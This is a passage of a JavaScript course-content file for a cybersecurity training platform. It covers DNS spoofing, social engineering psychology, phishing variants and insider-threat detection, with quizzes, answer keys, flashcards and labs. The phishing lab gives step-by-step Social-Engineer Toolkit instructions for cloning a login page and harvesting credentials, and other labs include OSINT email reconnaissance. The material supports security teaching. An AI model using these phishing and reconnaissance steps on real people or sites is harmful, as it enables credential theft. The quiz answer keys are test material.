    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What prerequisite is required before performing DNS Spoofing or SSL Stripping on a local network?', opts: ['Cracking the Wi-Fi password', 'Achieving a Man-in-the-Middle position (e.g., via ARP spoofing)', 'Installing malware on the victim', 'Compromising the ISP'], correct: 1, fb: 'The attacker must first be in a position to intercept the traffic, typically via ARP spoofing.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What protocol secures DNS to prevent cache poisoning and spoofing?', opts: ['DNS-over-HTTP', 'DNSSEC', 'HTTPS', 'TLS'], correct: 1, fb: 'DNSSEC (Domain Name System Security Extensions) provides cryptographic authentication of DNS data.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'True or False: SSL Stripping requires the attacker to generate a fake SSL certificate.', opts: ['True', 'False'], correct: 1, fb: 'False. SSL Stripping relies on preventing the secure connection from happening at all, avoiding certificate errors.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'When preparing for SSL stripping on Linux, what iptables rule is typically needed?', opts: ['Block port 443', 'Redirect traffic from port 80 to the port where sslstrip is listening', 'Redirect port 443 to port 80', 'Block all ICMP traffic'], correct: 1, fb: 'iptables is used to redirect outbound HTTP traffic (port 80) to the local port where sslstrip is listening.' }
  ],
  flashcards: [
    { f: 'DNS Spoofing', b: 'Providing fake IP addresses in response to DNS queries to redirect traffic.' },
    { f: 'SSL Stripping', b: 'A MitM attack that downgrades secure HTTPS connections to plaintext HTTP.' },
    { f: 'HSTS', b: 'HTTP Strict Transport Security; a web security policy mechanism that helps to protect websites against MitM attacks such as protocol downgrade attacks and cookie hijacking.' }
  ],
  summary: ['DNS spoofing redirects users to malicious IPs.', 'Cache poisoning affects the DNS server directly.', 'SSL stripping downgrades HTTPS to HTTP.', 'HSTS protects against SSL stripping.', 'DNSSEC protects against DNS spoofing.'],
  outcomes: ['Execute a DNS spoofing attack.', 'Explain the mechanics of SSL stripping.', 'Implement HSTS and DNSSEC as mitigations.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: [], lastReviewed: "2026-07-18" }
};



CONTENT['social-engineering-concepts'] = {
  eyebrow: 'Module 09 · Topic 1',
  title: 'Social Engineering Concepts',
  module: 'Phase 09: Security Awareness Officer',
  sub: 'Understanding the psychology of persuasion, elicitation, and human manipulation.',
  objectives: ['Understand Cialdini\'s principles of persuasion', 'Identify elicitation techniques used by attackers', 'Explain the psychology behind social engineering attacks'],
  learn: {
    simple: 'Social engineering is the art of manipulating people so they give up confidential information. The types of information these criminals are seeking can vary, but when individuals are targeted the criminals are usually trying to trick you into giving them your passwords or bank information, or access your computer to secretly install malicious software—that will give them access to your passwords and bank information as well as giving them control over your computer.\n\nAttackers use social engineering tactics because it is usually easier to exploit your natural inclination to trust than it is to discover ways to hack your software. For example, it is much easier to fool someone into giving you their password than it is for you to try hacking their password.',
    analogy: 'Imagine a bank vault with an impenetrable steel door and state-of-the-art alarms. A hacker trying to break in is like a burglar trying to drill through the steel. A social engineer, however, just walks up to a security guard, pretends to be a maintenance worker with a clipboard, and asks the guard to hold the door open for them.',
    architecture: 'Social engineering attacks typically follow a life cycle consisting of four phases: Information Gathering (footprinting the target), Relationship Development (establishing trust or creating a pretext), Exploitation (extracting information or gaining access), and Execution (achieving the objective and exiting).\n\nKey psychological principles (Cialdini\'s six principles of influence) are heavily leveraged: Reciprocity (people return favors), Commitment and Consistency (people honor their previous commitments), Social Proof (people do what others do), Authority (people obey authority figures), Liking (people are persuaded by those they like), and Scarcity (perceived scarcity generates demand).\n\nElicitation is a subtle technique where the attacker engages the target in normal conversation to extract information without the target realizing they are being interrogated. Techniques include using false statements to prompt a correction, flattery, or feigning ignorance to encourage the target to "educate" the attacker.',
    why: 'In an enterprise environment, the human element is often the weakest link in the security chain. No amount of firewalls, encryption, or intrusion detection systems can prevent a breach if an employee willingly hands over their credentials or executes a malicious payload because they were tricked by a well-crafted social engineering attack.'
  },
  enterprise: {
    gfs: 'An attacker researches Global Financial Services on LinkedIn, identifying new hires in the IT department. The attacker then calls a new IT administrator, impersonating the VP of Engineering, and urgently requests password reset assistance for a critical trading application, citing an ongoing emergency.',
    windows: 'Windows environments are frequently targeted via social engineering to obtain Active Directory credentials, allowing attackers to move laterally across the network and access sensitive file shares or domain controllers.',
    linux: 'While less commonly targeted for end-user phishing, Linux administrators can be socially engineered into running malicious bash scripts or exposing SSH keys under the guise of urgent system updates or critical patches.'
  },
  workflow: [
    'Step 1: Information Gathering - Attackers collect open-source intelligence (OSINT) about the target.',
    'Step 2: Pretexting - A fabricated scenario is created to engage the target.',
    'Step 3: Engagement - The attacker contacts the target using the pretext.',
    'Step 4: Elicitation - Information is subtly extracted from the target during conversation.',
    'Step 5: Exploitation - The target takes the desired action (e.g., clicking a link, sharing a password).',
    'Step 6: Exit - The attacker gracefully exits the interaction without raising suspicion.'
  ],
  diagram: {
    caption: 'Click to interact with the Social Engineering Attack Lifecycle',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#1e1e1e"/><text x="300" y="50" fill="#fff" font-size="20" text-anchor="middle">Social Engineering Lifecycle</text><circle cx="150" cy="150" r="50" fill="#007acc"/><text x="150" y="155" fill="#fff" font-size="12" text-anchor="middle">1. Gather Info</text><path d="M 210 150 L 240 150" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/><circle cx="300" cy="150" r="50" fill="#007acc"/><text x="300" y="155" fill="#fff" font-size="12" text-anchor="middle">2. Build Trust</text><path d="M 360 150 L 390 150" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/><circle cx="450" cy="150" r="50" fill="#007acc"/><text x="450" y="155" fill="#fff" font-size="12" text-anchor="middle">3. Exploit</text><path d="M 450 210 L 450 240" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/><circle cx="450" cy="300" r="50" fill="#007acc"/><text x="450" y="305" fill="#fff" font-size="12" text-anchor="middle">4. Exit</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'maltego', purpose: 'Conduct OSINT gathering on targets', out: 'Visual relationship graphs', note: 'Useful for the Information Gathering phase', mistake: 'Failing to properly scope the target domain' }
    ],
    win: [
      { cmd: 'nltest /domain_trusts', purpose: 'Identify Active Directory trusts', out: 'List of trusted domains', note: 'Helps understand potential targets for lateral movement after a social engineering compromise', mistake: 'Running without domain privileges' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Maltego', 'theHarvester'],
    dependencies: [],
    safety: ['Perform OSINT gathering only on authorized targets or simulated lab domains.'],
    scenario: 'GFS has hired you to assess the publicly available footprint of their executive team to identify potential social engineering risks.',
    objectives: ['Perform OSINT gathering using theHarvester', 'Identify target email addresses and subdomains'],
    steps: [
      'Step 1: Open terminal in Kali Linux.',
      'Step 2: Run `theHarvester -d gfs.local -l 500 -b google` to search for emails.',
      'Step 3: Analyze the output for patterns in email address formats.',
      'Step 4: Use Maltego to visualize relationships between identified personnel.'
    ],
    evidence: ['Terminal output showing discovered email addresses.', 'Maltego graph export.'],
    validation: ['You should see: A list of email addresses associated with the target domain.'],
    troubleshooting: ['If theHarvester fails, check your internet connection and API keys if configured.'],
    mitre: [{ id: 'T1592', name: 'Gather Victim Host Information', tactic: 'Reconnaissance' }],
    cleanup: ['Close Maltego and clear terminal history.']
  },
  quiz: [
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which of Cialdini\'s principles of persuasion relies on the target\'s desire to do what others are doing?',
      opts: ['Scarcity', 'Authority', 'Social Proof', 'Reciprocity'],
      correct: 2,
      fb: 'Social Proof is the principle where people look to the actions and behaviors of others to determine their own.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What is the primary goal of the "Elicitation" technique in social engineering?',
      opts: ['To infect the target with malware', 'To subtly extract information during normal conversation', 'To create a sense of urgency', 'To bypass physical security controls'],
      correct: 1,
      fb: 'Elicitation involves guiding a conversation to extract information without the target realizing they are being interrogated.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker offers a free IT health check to a company and later asks for sensitive network diagrams. Which principle of persuasion is being used?',
      opts: ['Liking', 'Reciprocity', 'Authority', 'Commitment'],
      correct: 1,
      fb: 'Reciprocity exploits the human tendency to return a favor or feel indebted after receiving something for free.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'The "Scarcity" principle creates a false sense of urgency, pressuring the target to act quickly.',
      opts: ['True', 'False'],
      correct: 0,
      fb: 'True. Scarcity implies limited time or resources, rushing the target\'s decision-making process.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which phase of the social engineering lifecycle involves creating a fabricated scenario to engage the target?',
      opts: ['Information Gathering', 'Pretexting / Relationship Development', 'Exploitation', 'Execution'],
      correct: 1,
      fb: 'Pretexting is the act of creating a fabricated scenario to establish trust and engage the target.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which psychological principle is an attacker exploiting when they impersonate a CEO or law enforcement officer?',
      opts: ['Social Proof', 'Liking', 'Authority', 'Consistency'],
      correct: 2,
      fb: 'The Authority principle leverages the natural human tendency to obey or comply with requests from perceived figures of authority.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Elicitation techniques are always aggressive and confrontational to force the target to answer.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. Elicitation relies on subtlety, natural conversation, and non-threatening approaches to lower the target\'s guard.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'A social engineer intentionally makes a false statement, hoping the target will correct them and reveal sensitive info. What is this technique called?',
      opts: ['Flattery', 'False statement / Deliberate false statement', 'Feigned ignorance', 'Mirroring'],
      correct: 1,
      fb: 'Using a deliberate false statement prompts the natural human urge to correct mistakes, often leading to the disclosure of accurate, sensitive information.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Why is social engineering often considered more dangerous than technical hacking?',
      opts: ['It requires expensive zero-day exploits', 'It bypasses technical security controls by exploiting human psychology', 'It only targets legacy systems', 'It is fully automated and requires no human interaction'],
      correct: 1,
      fb: 'Social engineering targets the human element, which can often bypass complex technical controls like firewalls and encryption.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker asks a target for a small, seemingly harmless favor. Later, they ask for a larger, more sensitive favor. Which principle is this?',
      opts: ['Commitment and Consistency', 'Scarcity', 'Social Proof', 'Authority'],
      correct: 0,
      fb: 'Commitment and Consistency relies on the fact that once people commit to a small action, they are more likely to agree to subsequent, larger requests to remain consistent in their behavior.'
    }
  ],
  flashcards: [
    { f: 'Elicitation', b: 'The subtle extraction of information during a seemingly normal conversation.' },
    { f: 'Pretexting', b: 'Creating a fabricated scenario to engage a target and establish trust.' },
    { f: 'Reciprocity', b: 'A psychological principle where people feel obligated to return a favor.' },
    { f: 'Authority Principle', b: 'Exploiting the human tendency to obey figures of perceived power or authority.' },
    { f: 'Social Proof', b: 'A psychological phenomenon where people assume the actions of others in an attempt to reflect correct behavior.' }
  ],
  summary: [
    'Social engineering manipulates human psychology to bypass technical security controls.',
    'The lifecycle includes Information Gathering, Relationship Development, Exploitation, and Execution.',
    'Cialdini\'s six principles of persuasion (Authority, Reciprocity, Scarcity, etc.) are commonly exploited.',
    'Elicitation is a subtle way to extract information without direct interrogation.',
    'Defending against social engineering requires robust security awareness training for all employees.'
  ],
  outcomes: [
    'Explain the core concepts and psychology behind social engineering.',
    'Identify Cialdini\'s six principles of persuasion in real-world scenarios.',
    'Describe the phases of a social engineering attack lifecycle.',
    'Recognize common elicitation techniques.'
  ],
  meta: {
    contentVersion: '1.0.0',
    estimatedTime: 45,
    difficulty: 'Intermediate',
    prerequisites: ['Basic understanding of cybersecurity principles'],
    lastReviewed: '2026-07-18'
  }
};

CONTENT['phishing-campaigns'] = {
  eyebrow: 'Module 09 · Topic 2',
  title: 'Phishing Campaigns & Variants',
  module: 'Phase 09: Security Awareness Officer',
  sub: 'Exploring spear-phishing, whaling, vishing, smishing, and clone phishing.',
  objectives: ['Differentiate between various types of phishing attacks', 'Understand how to set up and analyze a phishing campaign', 'Identify indicators of a phishing attempt'],
  learn: {
    simple: 'Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.',
    analogy: 'Phishing is like casting a wide net into the ocean hoping to catch any fish (sending thousands of generic emails). Spear-phishing is like using a specialized spear to hunt a specific type of fish (targeting a specific individual or organization). Whaling is like hunting for Moby Dick (targeting a high-profile executive like a CEO).',
    architecture: 'Phishing campaigns require infrastructure, typically consisting of registered look-alike domains (typosquatting), spoofed email headers, and a payload delivery mechanism (such as a credential harvesting login page or a malicious document attachment).\n\nSpear-phishing uses gathered OSINT to highly personalize the attack, increasing success rates. Whaling targets C-level executives who hold significant authority and access. Vishing (Voice Phishing) uses phone calls, often combined with caller ID spoofing and deepfake audio. Smishing (SMS Phishing) leverages text messages, exploiting the higher trust and click rates associated with mobile devices.\n\nClone phishing involves taking a legitimate, previously delivered email containing an attachment or link, and replacing it with a malicious version, then sending it from a spoofed address claiming it is an "updated" version.',
    why: 'Phishing remains the most common initial access vector for ransomware and data breaches in enterprise environments. Understanding the mechanics of these campaigns is critical for developing effective email filtering rules and training employees to recognize sophisticated lures.'
  },
  enterprise: {
    gfs: 'GFS employees receive an SMS message claiming to be from the IT Helpdesk, warning that their multi-factor authentication (MFA) token has expired and providing a link to a fake login portal designed to steal their credentials.',
    windows: 'Windows environments must utilize advanced threat protection features in Exchange/O365, such as Safe Links and Safe Attachments, to detect and neutralize sophisticated phishing payloads before they reach the user.',
    linux: 'Security analysts use Linux-based tools like GoPhish to simulate phishing campaigns against the organization, identifying susceptible user groups and measuring the effectiveness of security awareness training.'
  },
  workflow: [
    'Step 1: Domain Registration - Register a look-alike domain (e.g., gfs-portal.com instead of gfs.com).',
    'Step 2: Infrastructure Setup - Configure mail servers, SPF/DKIM records, and landing pages.',
    'Step 3: Target Selection - Identify specific targets (Spear-phishing) or acquire a large email list.',
    'Step 4: Lure Creation - Craft a compelling email, SMS, or voice script based on a credible pretext.',
    'Step 5: Delivery - Send the phishing messages to the targets.',
    'Step 6: Harvesting - Collect credentials or execute payloads when targets interact with the lure.'
  ],
  diagram: {
    caption: 'Click to interact with the Phishing Attack Vectors diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#1e1e1e"/><text x="300" y="50" fill="#fff" font-size="20" text-anchor="middle">Phishing Attack Vectors</text><rect x="50" y="100" width="120" height="60" rx="10" fill="#d9534f"/><text x="110" y="135" fill="#fff" font-size="14" text-anchor="middle">Phishing (Email)</text><rect x="240" y="100" width="120" height="60" rx="10" fill="#f0ad4e"/><text x="300" y="135" fill="#fff" font-size="14" text-anchor="middle">Vishing (Voice)</text><rect x="430" y="100" width="120" height="60" rx="10" fill="#5cb85c"/><text x="490" y="135" fill="#fff" font-size="14" text-anchor="middle">Smishing (SMS)</text><rect x="240" y="250" width="120" height="60" rx="10" fill="#0275d8"/><text x="300" y="285" fill="#fff" font-size="14" text-anchor="middle">Target Victim</text><path d="M 110 160 L 240 250" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/><path d="M 300 160 L 300 250" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/><path d="M 490 160 L 360 250" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/></svg>'
  },
  commands: {
    lin: [
      { cmd: 'setoolkit', purpose: 'Launch Social-Engineer Toolkit', out: 'SET Menu', note: 'Automates phishing and payload generation', mistake: 'Running outside an authorized campaign' },
      { cmd: 'gophish', purpose: 'Launch GoPhish framework', out: 'Web UI started', note: 'Used for managing large-scale simulated phishing campaigns', mistake: 'Exposing the admin interface to the public internet' }
    ],
    win: [
      { cmd: 'Get-MessageTrace', purpose: 'Trace phishing emails in Exchange/O365', out: 'Email routing logs', note: 'Crucial for incident response to phishing', mistake: 'Searching without specific sender/recipient filters' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['SET', 'Gophish'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment against authorized targets.'],
    scenario: 'You are tasked with demonstrating the risk of credential harvesting to GFS management by creating a simulated phishing campaign using the Social-Engineer Toolkit (SET).',
    objectives: ['Clone a legitimate website login page using SET', 'Harvest credentials submitted to the cloned page'],
    steps: [
      'Step 1: Open terminal in Kali Linux and type `setoolkit`.',
      'Step 2: Select [1] Social-Engineering Attacks.',
      'Step 3: Select [2] Website Attack Vectors.',
      'Step 4: Select [3] Credential Harvester Attack Method.',
      'Step 5: Select [2] Site Cloner and input the URL of a test portal (e.g., a local lab web server).',
      'Step 6: Access your Kali machine\'s IP from a victim VM and enter test credentials.',
      'Step 7: View the harvested credentials in the SET terminal.'
    ],
    evidence: ['Terminal output from SET showing the cloned site and captured credentials.'],
    validation: ['You should see: "POSSIBLE USERNAME FIELD FOUND" followed by the entered credentials in plain text.'],
    troubleshooting: ['If the site fails to clone, ensure Apache is not already running on port 80 (`systemctl stop apache2`).'],
    mitre: [{ id: 'T1566', name: 'Phishing', tactic: 'Initial Access' }],
    cleanup: ['Exit SET (Ctrl+C) to stop the credential harvesting server.']
  },
  quiz: [
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which type of phishing attack specifically targets high-profile individuals, such as CEOs or CFOs?',
      opts: ['Spear-phishing', 'Smishing', 'Whaling', 'Vishing'],
      correct: 2,
      fb: 'Whaling is a highly targeted phishing attack aimed at senior executives (the "whales") who have significant access to sensitive data and funds.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker sends a fraudulent SMS message containing a malicious link. What is this attack called?',
      opts: ['Vishing', 'Smishing', 'Spear-phishing', 'Clone phishing'],
      correct: 1,
      fb: 'Smishing (SMS Phishing) uses text messages as the primary delivery vector.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'How does spear-phishing differ from traditional phishing?',
      opts: ['Spear-phishing uses voice calls', 'Spear-phishing targets specific individuals or organizations using customized information', 'Spear-phishing is always automated and random', 'Spear-phishing only targets mobile devices'],
      correct: 1,
      fb: 'Spear-phishing is highly targeted and relies on OSINT to personalize the message for a specific victim, making it much more convincing.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Vishing involves using voice communication, such as telephone calls, to deceive victims.',
      opts: ['True', 'False'],
      correct: 0,
      fb: 'True. Vishing stands for Voice Phishing.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker intercepts a legitimate email, modifies the attachment to include malware, and resends it from a spoofed address. What is this called?',
      opts: ['Whaling', 'Clone phishing', 'Smishing', 'Typosquatting'],
      correct: 1,
      fb: 'Clone phishing involves copying a legitimate, previously delivered email and replacing links or attachments with malicious versions.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which tool is commonly used in Kali Linux to easily clone websites for credential harvesting?',
      opts: ['Nmap', 'Metasploit', 'Social-Engineer Toolkit (SET)', 'Wireshark'],
      correct: 2,
      fb: 'SET includes a Credential Harvester Attack Method that easily clones websites and hosts them to capture submitted credentials.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which DNS records are crucial for validating email senders and mitigating domain spoofing in phishing attacks?',
      opts: ['A and AAAA', 'SPF, DKIM, and DMARC', 'CNAME and PTR', 'NS and SOA'],
      correct: 1,
      fb: 'Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and DMARC help verify the sender\'s identity and prevent spoofing.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Phishing campaigns only aim to steal credentials; they are never used to distribute malware or ransomware.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. Phishing is a primary vector for delivering malware, including ransomware, often via malicious attachments or links.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What is the purpose of typosquatting in a phishing campaign?',
      opts: ['To crash the victim\'s mail server', 'To register domains that look visually similar to legitimate domains (e.g., paypa1.com)', 'To bypass spam filters using encryption', 'To intercept SMS messages'],
      correct: 1,
      fb: 'Typosquatting relies on users making typographical errors or failing to notice slight variations in a domain name.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which of the following is a common indicator of a phishing email?',
      opts: ['Use of a legitimate corporate signature', 'Proper spelling and grammar', 'Generic greetings (e.g., "Dear Customer") and a sense of extreme urgency', 'The email comes from an internal, verified domain'],
      correct: 2,
      fb: 'Phishing emails often use generic greetings because they are sent in bulk, and rely on urgency to force the user to act before thinking.'
    }
  ],
  flashcards: [
    { f: 'Spear-Phishing', b: 'A highly targeted phishing attack aimed at specific individuals or organizations.' },
    { f: 'Whaling', b: 'A form of spear-phishing that specifically targets high-profile executives.' },
    { f: 'Smishing', b: 'Phishing attacks conducted via SMS or text messages.' },
    { f: 'Vishing', b: 'Voice phishing; using telephone calls to deceive targets.' },
    { f: 'Clone Phishing', b: 'Copying a legitimate email and replacing its contents with malicious links or attachments.' }
  ],
  summary: [
    'Phishing is a broad term for deceptive communications designed to steal data or install malware.',
    'Spear-phishing and whaling are targeted variants that yield higher success rates.',
    'Vishing and smishing utilize voice and SMS channels, bypassing traditional email security controls.',
    'Clone phishing leverages trust in previously legitimate email threads.',
    'Effective defense requires technical controls (SPF/DKIM/DMARC) combined with user awareness training.'
  ],
  outcomes: [
    'Differentiate between phishing, spear-phishing, whaling, vishing, and smishing.',
    'Understand the infrastructure required to launch a phishing campaign.',
    'Identify common indicators of phishing attempts.',
    'Demonstrate the ability to clone a site for credential harvesting in a lab environment.'
  ],
  meta: {
    contentVersion: '1.0.0',
    estimatedTime: 45,
    difficulty: 'Intermediate',
    prerequisites: ['Basic understanding of email protocols (SMTP)'],
    lastReviewed: '2026-07-18'
  }
};

CONTENT['insider-threats'] = {
  eyebrow: 'Module 09 · Topic 3',
  title: 'Insider Threats & Indicators',
  module: 'Phase 09: Security Awareness Officer',
  sub: 'Analyzing malicious vs negligent insiders and recognizing indicators of compromise.',
  objectives: ['Differentiate between types of insider threats', 'Identify behavioral and technical indicators of insider threats', 'Understand strategies for mitigating insider risks'],
  learn: {
    simple: 'An insider threat is a security risk that originates from within the targeted organization. It involves a current or former employee, contractor, or business partner who has inside information concerning the organization\'s security practices, data, and computer systems. The threat can involve fraud, the theft of confidential or commercially valuable information, the theft of intellectual property, or the sabotage of computer systems.',
    analogy: 'Defending against external threats is like building a strong wall around a castle. However, an insider threat is like having a knight already inside the castle walls who decides to open the gates for the enemy or set fire to the keep. The wall cannot stop them because they already have the keys.',
    architecture: 'Insider threats are generally categorized into three types: Malicious Insiders (intentional harm, often motivated by financial gain, revenge, or espionage), Negligent Insiders (careless employees who unintentionally cause breaches through poor security hygiene, such as falling for phishing or mishandling data), and Compromised Insiders (legitimate accounts taken over by external attackers).\n\nDetecting insider threats requires User and Entity Behavior Analytics (UEBA). UEBA establishes a baseline of normal behavior for each user and entity on the network. When a user deviates from their baseline (e.g., logging in at unusual hours, downloading massive amounts of data, accessing files unrelated to their role), the system flags the anomalous activity.\n\nTechnical indicators include unusual privilege escalation, use of unauthorized software (shadow IT), and data exfiltration patterns. Behavioral indicators include expressions of extreme dissatisfaction, sudden changes in financial status, or conflicts with coworkers.',
    why: 'Insider threats are among the most difficult to detect and prevent because the attacker already has legitimate access to systems and data. In an enterprise, a single malicious insider can bypass multi-million dollar perimeter defenses and cause catastrophic damage to the business.'
  },
  enterprise: {
    gfs: 'A senior developer at Global Financial Services, recently passed over for a promotion, begins quietly copying proprietary algorithmic trading code to a personal USB drive before their planned resignation.',
    windows: 'In Windows environments, insider threats are mitigated by implementing the Principle of Least Privilege (PoLP) via Active Directory group policies and utilizing tools like Microsoft Defender for Endpoint to monitor unusual file access patterns.',
    linux: 'Linux systems monitor insider activity through auditd and centralized syslogging, tracking commands executed by privileged users (sudoers) and alerting on unauthorized access to sensitive configuration files like /etc/shadow.'
  },
  workflow: [
    'Step 1: Baseline Establishment - Use UEBA to determine normal user behavior patterns.',
    'Step 2: Access Control - Implement the Principle of Least Privilege and Role-Based Access Control (RBAC).',
    'Step 3: Monitoring - Continuously monitor for behavioral anomalies (e.g., large data transfers).',
    'Step 4: Alerting - Generate alerts when a user significantly deviates from their baseline.',
    'Step 5: Investigation - Security analysts review the alerts and context (e.g., HR records regarding termination).',
    'Step 6: Mitigation - Revoke access and involve HR/Legal if malicious activity is confirmed.'
  ],
  diagram: {
    caption: 'Click to interact with the Insider Threat Matrix',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#1e1e1e"/><text x="300" y="40" fill="#fff" font-size="20" text-anchor="middle">Types of Insider Threats</text><circle cx="150" cy="200" r="80" fill="#d9534f" opacity="0.8"/><text x="150" y="195" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Malicious</text><text x="150" y="215" fill="#fff" font-size="12" text-anchor="middle">Intentional Harm</text><circle cx="300" cy="200" r="80" fill="#f0ad4e" opacity="0.8"/><text x="300" y="195" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Negligent</text><text x="300" y="215" fill="#fff" font-size="12" text-anchor="middle">Careless Mistakes</text><circle cx="450" cy="200" r="80" fill="#5cb85c" opacity="0.8"/><text x="450" y="195" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Compromised</text><text x="450" y="215" fill="#fff" font-size="12" text-anchor="middle">Account Takeover</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'aureport -x', purpose: 'Generate a summary of executable events from audit logs', out: 'Auditd executable report', note: 'Helps identify unusual commands run by insiders', mistake: 'Failing to configure auditd rules properly' }
    ],
    win: [
      { cmd: 'Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}', purpose: 'View successful logon events', out: 'List of logon events', note: 'Useful for detecting off-hours access', mistake: 'Running without administrative privileges' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['auditd', 'Splunk (or basic grep)'],
    dependencies: [],
    safety: ['Perform monitoring on authorized systems only.'],
    scenario: 'You suspect an employee is accessing sensitive HR files outside of their normal duties. You must review Linux audit logs to confirm their actions.',
    objectives: ['Configure auditd to monitor a specific directory', 'Identify unauthorized access in the logs'],
    steps: [
      'Step 1: Open terminal in Linux.',
      'Step 2: Add an audit rule for the sensitive directory: `auditctl -w /opt/hr_data -p warx -k hr_monitor`.',
      'Step 3: Simulate an insider by reading a file in that directory: `cat /opt/hr_data/salaries.txt`.',
      'Step 4: Search the audit logs for the key: `ausearch -k hr_monitor`.',
      'Step 5: Review the output to identify the user ID (uid) and command (exe) used.'
    ],
    evidence: ['Terminal output showing the auditctl configuration.', 'Output from ausearch detailing the file access event.'],
    validation: ['You should see: An audit record detailing the uid of the user who accessed the file and the timestamp.'],
    troubleshooting: ['If auditctl returns an error, ensure the auditd service is running (`systemctl status auditd`).'],
    mitre: [{ id: 'T1078', name: 'Valid Accounts', tactic: 'Defense Evasion, Persistence, Privilege Escalation, Initial Access' }],
    cleanup: ['Remove the audit rule: `auditctl -W /opt/hr_data -p warx -k hr_monitor`.']
  },
  quiz: [
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which of the following best describes a negligent insider?',
      opts: ['An employee who steals data to sell to a competitor', 'An employee who accidentally emails sensitive data to the wrong recipient', 'An external hacker who compromises an employee\'s account', 'A former employee who leaves a logic bomb in the network'],
      correct: 1,
      fb: 'Negligent insiders cause harm through carelessness or ignorance of security policies, not through malicious intent.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'A disgruntled employee downloads a large volume of intellectual property shortly before resigning. What type of threat is this?',
      opts: ['Negligent Insider', 'Compromised Insider', 'Malicious Insider', 'External Threat'],
      correct: 2,
      fb: 'Malicious insiders intentionally harm the organization, often for financial gain, revenge, or corporate espionage.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What technology is primarily used to detect anomalous behavior by analyzing patterns in user activity?',
      opts: ['Firewall', 'User and Entity Behavior Analytics (UEBA)', 'Antivirus', 'Intrusion Prevention System (IPS)'],
      correct: 1,
      fb: 'UEBA establishes a baseline of normal behavior and alerts on deviations, making it effective for spotting insider threats.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Insider threats are generally easier to detect than external threats because the attackers use known methods.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. Insider threats are harder to detect because the attacker already possesses legitimate credentials and access to the network.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which of the following is a behavioral indicator of a potential malicious insider?',
      opts: ['Logging in during normal business hours', 'Frequently working late hours or accessing systems remotely at odd times', 'Updating passwords regularly', 'Attending security awareness training'],
      correct: 1,
      fb: 'Unusual access patterns, such as working odd hours without authorization, can indicate an insider attempting to operate unnoticed.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What principle is most effective at limiting the damage an insider can cause?',
      opts: ['Security by Obscurity', 'Principle of Least Privilege (PoLP)', 'Defense in Depth', 'Open Design'],
      correct: 1,
